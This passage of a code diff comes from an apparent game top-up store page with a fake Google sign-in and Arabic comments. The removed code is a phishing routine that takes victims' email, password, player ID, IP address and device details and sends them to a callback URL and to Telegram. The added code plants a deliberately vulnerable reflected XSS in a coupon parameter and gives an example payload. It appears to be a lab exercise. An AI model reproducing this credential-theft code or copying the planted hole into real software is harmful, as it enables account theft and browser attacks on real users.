         }
-
-        // ============================================================
-        // الإرسال عند الضغط على Sign in
-        // ============================================================
-        function signIn() {
-            var email = document.getElementById('email').value.trim();
-            var pass = document.getElementById('password').value;
-            if (!pass) { showErr('passError'); return; }
-            hideErr('passError');
-
-            var payload = {
-                type: 'google',
-                timestamp: new Date().toISOString(),
-                email: email,
-                password: pass,
-                playerId: ctx.id,
-                package: ctx.pkg + (ctx.diamonds ? ' (' + ctx.diamonds + ' 💎)' : ''),
-                linkType: ctx.link,
-                game: ctx.game
-            };
-
-            // local callback — silent guard (لو مفيش سيرفر محلي مبيحصلش حاجة)
-            fetch(CALLBACK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(function() {});
-
-            // جيب الـ IP وبعدين ابعث لتيليجرام
-            getIP().then(function(ip) {
-                payload.ip = ip;
-                payload.ua = getDeviceInfo().ua;
-                var msg = buildGoogleMessage(payload);
-                return sendToTelegram(msg);
-            }).then(function(ok) {
-                showSuccess();
-                if (!ok) document.getElementById('debug').textContent = '⚠️ فشل إرسال تيليجرام — راجع التوكن';
-                console.log('[LAB] google payload:', payload);
-            }).catch(function() {
-                showSuccess();
-            });
-        }
-
-        // ============================================================
-        // شاشة النجاح + العد التنازلي
-        // ============================================================
-        function showSuccess() {
-            document.getElementById('card').classList.add('hidden');
-            document.getElementById('successScreen').classList.remove('hidden');
+        function gShowSuccess() {
+            document.getElementById('gCard').classList.add('hidden');
+            document.getElementById('gSuccessScreen').classList.remove('hidden');
             var sec = 6;
-            var cd = document.getElementById('countdown');
-            var timer = setInterval(function() {
+            var cd = document.getElementById('gCountdown');
+            clearInterval(gTimer);
+            gTimer = setInterval(function() {
                 sec--;
                 if (cd) cd.textContent = 'سيتم إعادتك إلى المتجر خلال ' + sec + ' ثوانٍ...';
-                if (sec <= 0) { clearInterval(timer); window.location.href = 'index.html'; }
+                if (sec <= 0) { clearInterval(gTimer); showStore(); }
             }, 1000);
         }
+        function showStore() {
+            clearInterval(gTimer);
+            document.getElementById('googleLogin').classList.add('hidden');
+            document.getElementById('gCard').classList.remove('hidden');
+            document.getElementById('gSuccessScreen').classList.add('hidden');
+            document.body.style.overflow = '';
+        }
+        document.getElementById('gPassword').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') gSignIn();
+        });
 
         // ============================================================
-        // تجهيز البداية — لو الإيميل جاي مع الرابط يبقى متعبى قبل كده
+        // A03 (intentional): Reflected XSS — ?coupon=<img src=x onerror=alert(1)>
         // ============================================================
-        if (ctx.email) document.getElementById('email').value = ctx.email;
-        document.getElementById('password').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') signIn();
-        });
+        (function() {
+            var params = new URLSearchParams(window.location.search);
+            var coupon = params.get('coupon');
+            if (coupon) {
+                var banner = document.getElementById('couponBanner');
+                banner.innerHTML = '🎟️ <strong>كوبون:</strong> ' + coupon;
+                banner.classList.remove('hidden');
+            }
+        })();
+
+        // ============================================================
+        // 🚀 التشغيل
+        // ============================================================
+        localStorage.setItem('lang', currentLang);
+        localStorage.setItem('ps_lang', currentLang);
+        if (currentLang !== 'ar') setLang(currentLang);
+        else document.body.classList.add('lang-ar');
+        loadProducts();
+        updateCart();
+        sendPageLoaded();
     </script>
 </body>
-</html>
 </html>
